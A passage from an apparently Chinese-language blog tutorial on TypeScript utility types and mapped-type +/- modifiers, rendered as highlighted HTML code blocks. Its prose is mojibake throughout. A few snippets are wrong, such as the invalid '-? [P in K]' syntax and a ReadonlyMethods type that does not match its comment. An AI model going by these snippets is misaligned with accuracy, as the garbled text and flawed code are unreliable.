class="hljs-literal">null</span> | <span class="hljs-literal">undefined</span>&gt;; <span class="hljs-comment">// string</span><br></code></pre></td></tr></table></figure><p><strong>å‡½æ•°æ“ä½œå·¥å…·ç±»å‹</strong></p><ol><li><code>Parameters&lt;T extends (...args: any) =&gt; any&gt;</code>: è·å–å‡½æ•°å‚æ•°ç±»å‹å…ƒç»„</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Parameters</span>&lt;T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; <span class="hljs-built_in">any</span>&gt; = <br>  T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: infer P) =&gt; <span class="hljs-built_in">any</span> ? P : <span class="hljs-built_in">never</span>;<br></code></pre></td></tr></table></figure><ul><li>å®ç°åŸç†ï¼šinfer æ¨å¯¼å‚æ•°ç±»å‹</li><li>ç¤ºä¾‹ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">FnParams</span> = <span class="hljs-title class_">Parameters</span>&lt;<span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>&gt;; <span class="hljs-comment">// [string, number]</span><br></code></pre></td></tr></table></figure><ol start="2"><li><code>ReturnType&lt;T extends (...args: any) =&gt; any&gt;</code>: è·å–å‡½æ•°è¿”å›å€¼ç±»å‹</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReturnType</span>&lt;T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; <span class="hljs-built_in">any</span>&gt; = <br>  T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; infer R ? R : <span class="hljs-built_in">any</span>;<br></code></pre></td></tr></table></figure><ul><li>å®ç°åŸç†ï¼šinfer æ¨å¯¼è¿”å›ç±»å‹</li><li>ç¤ºä¾‹ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">FnReturn</span> = <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">boolean</span>&gt;; <span class="hljs-comment">// boolean</span><br></code></pre></td></tr></table></figure><ol start="3"><li><code>ConstructorParameters&lt;T extends new (...args: any) =&gt; any&gt;</code>: è·å–æ„é€ å‡½æ•°å‚æ•°ç±»å‹å…ƒç»„</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ConstructorParameters</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title function_">new</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; <span class="hljs-built_in">any</span>&gt; = <br>  T <span class="hljs-keyword">extends</span> <span class="hljs-title function_">new</span> (...<span class="hljs-attr">args</span>: infer P) =&gt; <span class="hljs-built_in">any</span> ? P : <span class="hljs-built_in">never</span>;<br></code></pre></td></tr></table></figure><ul><li>å®ç°åŸç†ï¼šinfer æ¨å¯¼æ„é€ å‡½æ•°å‚æ•°</li><li>ç¤ºä¾‹ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span></span>) &#123;&#125;<br>&#125;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Params</span> = <span class="hljs-title class_">ConstructorParameters</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Person</span>&gt;; <span class="hljs-comment">// [string, number]</span><br></code></pre></td></tr></table></figure><p><strong>é«˜çº§å·¥å…·ç±»å‹</strong></p><ol><li><code>ThisParameterType&lt;T&gt;</code>: æå–å‡½æ•°çš„ this å‚æ•°ç±»å‹</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ThisParameterType</span>&lt;T&gt; = <br>  T <span class="hljs-title function_">extends</span> (<span class="hljs-attr">this</span>: infer U, ...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; <span class="hljs-built_in">any</span> ? U : <span class="hljs-built_in">unknown</span>;<br></code></pre></td></tr></table></figure><ul><li>å®ç°åŸç†ï¼šinfer æ•è· this ç±»å‹</li><li>ç¤ºä¾‹ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"><span class="hljs-attr">this</span>: <span class="hljs-title class_">Window</span></span>) &#123;&#125;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ThisType</span> = <span class="hljs-title class_">ThisParameterType</span>&lt;<span class="hljs-keyword">typeof</span> fn&gt;; <span class="hljs-comment">// Window</span><br></code></pre></td></tr></table></figure><ol start="2"><li><code>OmitThisParameter&lt;T&gt;</code>: ç§»é™¤å‡½æ•°çš„ this å‚æ•°ç±»å‹</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">OmitThisParameter</span>&lt;T&gt; = <br>  <span class="hljs-built_in">unknown</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ThisParameterType</span>&lt;T&gt; ? T : <br>  T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: infer A) =&gt; infer R ? <span class="hljs-function">(<span class="hljs-params">...<span class="hljs-attr">args</span>: A</span>) =&gt;</span> R : T;<br></code></pre></td></tr></table></figure><ul><li>å®ç°åŸç†ï¼šç»„åˆ ThisParameterType + å‚æ•°æ¨å¯¼</li><li>ç¤ºä¾‹ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">WithoutThis</span> = <span class="hljs-title class_">OmitThisParameter</span>&lt;<span class="hljs-keyword">typeof</span> fn&gt;; <span class="hljs-comment">// () =&gt; void</span><br></code></pre></td></tr></table></figure><ol start="3"><li><code>Awaited&lt;T&gt;</code>: é€’å½’è§£åŒ… Promise ç±»å‹</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Awaited</span>&lt;T&gt; =<br>    T <span class="hljs-keyword">extends</span> <span class="hljs-literal">null</span> | <span class="hljs-literal">undefined</span> ? T : <span class="hljs-comment">// ç‰¹æ®Šå¤„ç† null/undefined</span><br>    T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">object</span> &amp; &#123; <span class="hljs-title function_">then</span>(<span class="hljs-attr">onfulfilled</span>: infer F): <span class="hljs-built_in">any</span> &#125; ? <span class="hljs-comment">// æ£€æŸ¥ thenable å¯¹è±¡</span><br>        F <span class="hljs-title function_">extends</span> (<span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">value</span>: infer V, ...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">any</span>) ? <br>            <span class="hljs-title class_">Awaited</span>&lt;V&gt; : <span class="hljs-comment">// é€’å½’è§£åŒ…</span><br>        <span class="hljs-built_in">never</span> : <br>    T; <span class="hljs-comment">// é Promise ç±»å‹ç›´æ¥è¿”å›</span><br></code></pre></td></tr></table></figure><ul><li>å®ç°åŸç†ï¼šæ¡ä»¶ç±»å‹é€’å½’ + thenable æ£€æµ‹</li><li>ç¤ºä¾‹ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-variable constant_">T3</span> = <span class="hljs-title class_">Awaited</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;&gt;; <span class="hljs-comment">// string</span><br></code></pre></td></tr></table></figure><p><strong>æºç è®¾è®¡æ¨¡å¼åˆ†æ</strong></p><ol><li>åˆ†å¸ƒå¼æ¡ä»¶ç±»å‹</li></ol><p>å½“æ³›å‹å‚æ•°ä¸ºè”åˆç±»å‹æ—¶ï¼Œæ¡ä»¶ç±»å‹ä¼šåˆ†å¸ƒå¼åº”ç”¨ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// Exclude ä¸­çš„åˆ†å¸ƒå¼ç‰¹æ€§</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Exclude</span>&lt;T, U&gt; = T <span class="hljs-keyword">extends</span> U ? <span class="hljs-built_in">never</span> : T;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">Exclude</span>&lt;<span class="hljs-string">&#x27;a&#x27;</span> | <span class="hljs-string">&#x27;b&#x27;</span> | <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span> | <span class="hljs-string">&#x27;b&#x27;</span>&gt;; <span class="hljs-comment">// &#x27;c&#x27;</span><br><br><span class="hljs-comment">// ç­‰ä»·äºï¼š</span><br>(<span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">&#x27;a&#x27;</span> | <span class="hljs-string">&#x27;b&#x27;</span> ? <span class="hljs-built_in">never</span> : <span class="hljs-string">&#x27;a&#x27;</span>) |<br>(<span class="hljs-string">&#x27;b&#x27;</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">&#x27;a&#x27;</span> | <span class="hljs-string">&#x27;b&#x27;</span> ? <span class="hljs-built_in">never</span> : <span class="hljs-string">&#x27;b&#x27;</span>) |<br>(<span class="hljs-string">&#x27;c&#x27;</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">&#x27;a&#x27;</span> | <span class="hljs-string">&#x27;b&#x27;</span> ? <span class="hljs-built_in">never</span> : <span class="hljs-string">&#x27;c&#x27;</span>)<br></code></pre></td></tr></table></figure><ol start="2"><li>ç±»å‹é€’å½’æ¨¡å¼</li></ol><p>å¤„ç†åµŒå¥—ç»“æ„çš„å…³é”®æŠ€æœ¯ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å†…ç½®å·¥å…·ç±»å‹ä¸­çš„é€’å½’</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">DeepReadonly</span>&lt;T&gt; = &#123;<br>  <span class="hljs-keyword">readonly</span> [P <span class="hljs-keyword">in</span> keyof T]: T[P] <span class="hljs-keyword">extends</span> <span class="hljs-built_in">object</span> <br>    ? <span class="hljs-title class_">DeepReadonly</span>&lt;T[P]&gt; <br>    : T[P];<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>ç±»å‹æ¨æ–­ä¼˜å…ˆçº§</li></ol><p>infer å…³é”®å­—çš„å·¥ä½œæœºåˆ¶ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åå˜ä½ç½®ï¼ˆè¿”å›å€¼ï¼‰æ¨æ–­</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">GetReturnType</span>&lt;T&gt; = T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; infer R ? R : <span class="hljs-built_in">any</span>;<br><br><span class="hljs-comment">// é€†å˜ä½ç½®ï¼ˆå‚æ•°ï¼‰æ¨æ–­</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">GetFirstArg</span>&lt;T&gt; = T <span class="hljs-title function_">extends</span> (<span class="hljs-attr">arg</span>: infer A, ...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; <span class="hljs-built_in">any</span> ? A : <span class="hljs-built_in">never</span>;<br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹å®è·µè¦ç‚¹</strong></p><ol><li>é¿å…è¿‡åº¦åµŒå¥—ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å±é™©ï¼šæ·±å±‚åµŒå¥—å¯èƒ½å¯¼è‡´ç±»å‹å®ä¾‹åŒ–è¿‡æ·±é”™è¯¯</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">DeepNested</span> = <span class="hljs-title class_">Awaited</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;&gt;&gt;;<br><br><span class="hljs-comment">// è§£å†³æ–¹æ¡ˆï¼šè®¾ç½®é€’å½’æ·±åº¦é™åˆ¶</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">SafeAwaited</span>&lt;T, <span class="hljs-title class_">Depth</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">number</span> = <span class="hljs-number">5</span>&gt; = <br>  <span class="hljs-title class_">Depth</span> <span class="hljs-keyword">extends</span> <span class="hljs-number">0</span> ? T :<br>  T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt; ? <span class="hljs-title class_">SafeAwaited</span>&lt;U, [-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>][<span class="hljs-title class_">Depth</span>]&gt; : T;<br></code></pre></td></tr></table></figure><ol start="2"><li>æ€§èƒ½æ•æ„Ÿåœºæ™¯ä¼˜åŒ–ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä½¿ç”¨å†…ç½®å·¥å…·ç±»å‹æ›¿ä»£è‡ªå®šä¹‰å¤æ‚ç±»å‹</span><br><span class="hljs-comment">// ä¸æ¨èï¼š</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">MyPartial</span>&lt;T&gt; = &#123; [P <span class="hljs-keyword">in</span> keyof T]?: T[P] &#125;;<br><br><span class="hljs-comment">// æ¨èï¼šç›´æ¥ä½¿ç”¨ Partial</span><br></code></pre></td></tr></table></figure><ol start="3"><li>ç±»å‹å®‰å…¨æ£€æŸ¥ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç¡®ä¿å·¥å…·ç±»å‹å®‰å…¨</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">SafeExtract</span>&lt;T, U&gt; = [T] <span class="hljs-keyword">extends</span> [U] ? T : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// é˜²æ­¢åˆ†å¸ƒå¼è¡Œä¸º</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">DistributiveCheck</span>&lt;T&gt; = [T] <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">never</span>] ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure><ol start="4"><li>æºç è°ƒè¯•æŠ€å·§ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä½¿ç”¨ç±»å‹æ‰“å°è°ƒè¯•</span><br><span class="hljs-keyword">type</span> _Debug&lt;T&gt; = T <span class="hljs-keyword">extends</span> infer U ? U : <span class="hljs-built_in">never</span>;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Reveal</span>&lt;T&gt; = &#123; [P <span class="hljs-keyword">in</span> keyof T]: T[P] &#125; &amp; &#123;&#125;;<br><br><span class="hljs-comment">// æŸ¥çœ‹å®é™…ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">DebugView</span> = <span class="hljs-title class_">Reveal</span>&lt;<span class="hljs-title class_">SomeComplexType</span>&gt;;<br></code></pre></td></tr></table></figure><p><strong>å†…ç½®å·¥å…·ç±»å‹å…³ç³»å›¾</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs text">åŸºç¡€æ“ä½œ<br>â”œâ”€ Partial<br>â”œâ”€ Required<br>â”œâ”€ Readonly<br>â”‚<br>ç»“æ„æ“ä½œ<br>â”œâ”€ Pick<br>â”œâ”€ Omit â†’ ä¾èµ– Exclude<br>â”œâ”€ Record<br>â”‚<br>é›†åˆæ“ä½œ<br>â”œâ”€ Exclude<br>â”œâ”€ Extract<br>â”œâ”€ NonNullable<br>â”‚<br>å‡½æ•°æ“ä½œ<br>â”œâ”€ Parameters<br>â”œâ”€ ReturnType<br>â”œâ”€ ConstructorParameters<br>â”œâ”€ ThisParameterType<br>â””â”€ OmitThisParameter<br></code></pre></td></tr></table></figure><h3 id="2-1-2-ç±»å‹æ˜ å°„ä¿®é¥°ç¬¦ï¼ˆ-ï¼‰åŸç†"><a href="#2-1-2-ç±»å‹æ˜ å°„ä¿®é¥°ç¬¦ï¼ˆ-ï¼‰åŸç†" class="headerlink" title="2.1.2 ç±»å‹æ˜ å°„ä¿®é¥°ç¬¦ï¼ˆ+&#x2F;-ï¼‰åŸç†"></a>2.1.2 ç±»å‹æ˜ å°„ä¿®é¥°ç¬¦ï¼ˆ+&#x2F;-ï¼‰åŸç†</h3><p><strong>ä¿®é¥°ç¬¦åŸºç¡€æ¦‚å¿µ</strong></p><p>ç±»å‹æ˜ å°„ä¿®é¥°ç¬¦ç”¨äºæ§åˆ¶å±æ€§ä¿®é¥°ç¬¦ï¼ˆ? å’Œ readonlyï¼‰çš„æ·»åŠ æˆ–ç§»é™¤ï¼š</p><table><thead><tr><th align="left">ä¿®é¥°ç¬¦</th><th align="left">ä½œç”¨</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">+</td><td align="left">æ·»åŠ ä¿®é¥°ç¬¦ï¼ˆé»˜è®¤è¡Œä¸ºï¼‰</td><td align="left"><code>&#123; +readonly [P in K]: T &#125;</code></td></tr><tr><td align="left">-</td><td align="left">ç§»é™¤ä¿®é¥°ç¬¦</td><td align="left"><code>&#123; -? [P in K]: T &#125;</code></td></tr></tbody></table><p><strong>æ ¸å¿ƒè¯­æ³•è§£æ</strong></p><ol><li>æ·»åŠ ä¿®é¥°ç¬¦ï¼ˆæ˜¾å¼+ï¼‰ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ˜¾å¼æ·»åŠ åªè¯»å±æ€§</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">AddReadonly</span>&lt;T&gt; = &#123;<br>  +<span class="hljs-keyword">readonly</span> [P <span class="hljs-keyword">in</span> keyof T]: T[P];<br>&#125;;<br><br><span class="hljs-comment">// æ˜¾å¼æ·»åŠ å¯é€‰å±æ€§</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">AddOptional</span>&lt;T&gt; = &#123;<br>  [P <span class="hljs-keyword">in</span> keyof T]+?: T[P];<br>&#125;;<br></code></pre></td></tr></table></figure><ol start="2"><li>ç§»é™¤ä¿®é¥°ç¬¦ï¼ˆ-ï¼‰ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç§»é™¤åªè¯»å±æ€§</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">RemoveReadonly</span>&lt;T&gt; = &#123;<br>  -<span class="hljs-keyword">readonly</span> [P <span class="hljs-keyword">in</span> keyof T]: T[P];<br>&#125;;<br><br><span class="hljs-comment">// ç§»é™¤å¯é€‰å±æ€§</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">RemoveOptional</span>&lt;T&gt; = &#123;<br>  [P <span class="hljs-keyword">in</span> keyof T]-?: T[P];<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>å®ç°åŸç†åˆ†æ</strong></p><ol><li>ä¿®é¥°ç¬¦çš„ç¼–è¯‘è½¬æ¢ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æºç ï¼š</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Mutable</span>&lt;T&gt; = &#123;<br>  -<span class="hljs-keyword">readonly</span> [P <span class="hljs-keyword">in</span> keyof T]: T[P];<br>&#125;;<br><br><span class="hljs-comment">// ç¼–è¯‘åç­‰ä»·äºï¼š</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Mutable</span>&lt;T&gt; = &#123;<br>  [P <span class="hljs-keyword">in</span> keyof T]: T[P];<br>&#125;;<br></code></pre></td></tr></table></figure><ol start="2"><li>ç±»å‹ç³»ç»Ÿå†…éƒ¨å¤„ç†ï¼š<ul><li><code>+</code> æ“ä½œï¼šæ·»åŠ å±æ€§æè¿°ç¬¦æ ‡å¿—</li><li><code>-</code> æ“ä½œï¼šæ¸…é™¤å±æ€§æè¿°ç¬¦æ ‡å¿—</li><li>æ˜ å°„è¿‡ç¨‹æœ¬è´¨æ˜¯åˆ›å»ºæ–°å±æ€§æè¿°ç¬¦</li></ul></li></ol><p><strong>å†…ç½®å·¥å…·ç±»å‹åº”ç”¨</strong></p><ol><li><code>Required&lt;T&gt;</code> å®ç°ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Required</span>&lt;T&gt; = &#123;<br>  [P <span class="hljs-keyword">in</span> keyof T]-?: T[P];<br>&#125;;<br></code></pre></td></tr></table></figure><ol start="2"><li><code>Readonly&lt;T&gt;</code> å®ç°ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Readonly</span>&lt;T&gt; = &#123;<br>  +<span class="hljs-keyword">readonly</span> [P <span class="hljs-keyword">in</span> keyof T]: T[P];<br>&#125;;<br></code></pre></td></tr></table></figure><ol start="3"><li><code>Mutable&lt;T&gt;</code>ï¼ˆéå†…ç½®ä½†å¸¸ç”¨ï¼‰ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Mutable</span>&lt;T&gt; = &#123;<br>  -<span class="hljs-keyword">readonly</span> [P <span class="hljs-keyword">in</span> keyof T]: T[P];<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>ç»„åˆä¿®é¥°ç¬¦æŠ€å·§</strong></p><ol><li>åŒæ—¶æ·»åŠ &#x2F;ç§»é™¤å¤šä¸ªä¿®é¥°ç¬¦ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åˆ›å»ºå¯å˜ä¸”å¿…å¡«çš„ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">MutableRequired</span>&lt;T&gt; = &#123;<br>  -<span class="hljs-keyword">readonly</span> [P <span class="hljs-keyword">in</span> keyof T]-?: T[P];<br>&#125;;<br><br><span class="hljs-comment">// ç­‰ä»·äºï¼š</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">MutableRequired</span>&lt;T&gt; = <span class="hljs-title class_">Mutable</span>&lt;<span class="hljs-title class_">Required</span>&lt;T&gt;&gt;;<br></code></pre></td></tr></table></figure><ol start="2"><li>æ¡ä»¶ä¿®é¥°ç¬¦ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä»…å¯¹å‡½æ•°å±æ€§æ·»åŠ åªè¯»</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReadonlyMethods</span>&lt;T&gt; = &#123;<br>  <span class="hljs-keyword">readonly</span> [P <span class="hljs-keyword">in</span> keyof T]: T[P] <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Function</span> ? T[P] : <span class="hljs-built_in">never</span>;<br>&#125; &amp; &#123;<br>  [P <span class="hljs-keyword">in</span> keyof T <span class="hljs-keyword">as</span> T[P] <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Function</span> ? <span class="hljs-built_in">never</span> : P]: T[P];<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹å®è·µæŒ‡å—</strong></p><ol><li>ä¸å¯å˜çŠ¶æ€ç®¡ç†ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åˆ›å»ºæ·±åº¦åªè¯»çŠ¶æ€</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ImmutableState</span>&lt;T&gt; = &#123;<br>  +<span class="hljs-keyword">readonly</span> [P <span class="hljs-keyword">in</span> keyof T]: <span class="hljs-title class_">ImmutableState</span>&lt;T[P]&gt;;<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span 